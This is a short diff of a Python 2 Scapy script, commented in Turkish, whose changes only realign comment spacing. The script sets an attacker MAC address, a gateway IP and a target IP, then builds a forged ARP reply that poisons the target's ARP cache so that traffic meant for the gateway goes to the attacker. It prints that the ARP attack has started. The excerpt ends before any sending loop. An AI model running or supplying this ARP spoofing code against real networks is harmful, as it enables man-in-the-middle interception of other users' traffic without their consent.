@@ -4,12 +4,12 @@
 import sys
 from scapy.all import *
 
-conf.verb     = 0					           # Çıktıları kapatıyoruz
+conf.verb     = 0			 # Çıktıları kapatıyoruz
 
-op     		  =  2 				           	 # ARP replay için tanımlana kod
-attackerMAC   = 'c4:6e:1f:17:ed:b3'  # Saldırı yapacak cihazın MAC adresi
+op     		  =  2 		         # ARP replay için tanımlana kod
+attackerMAC   = 'c4:6e:1f:17:ed:b3'      # Saldırı yapacak cihazın MAC adresi
 gateway       = '192.168.2.1'	    	 # Gateway IP adresi
-hedefIP       = '192.168.2.48'       # Hedefin IP adresi
+hedefIP       = '192.168.2.48'           # Hedefin IP adresi
 
 arp=ARP(op=op,psrc=gateway,pdst=hedefIP, hwsrc=attackerMAC)
 print "ARP Saldırısı Başladı ... "
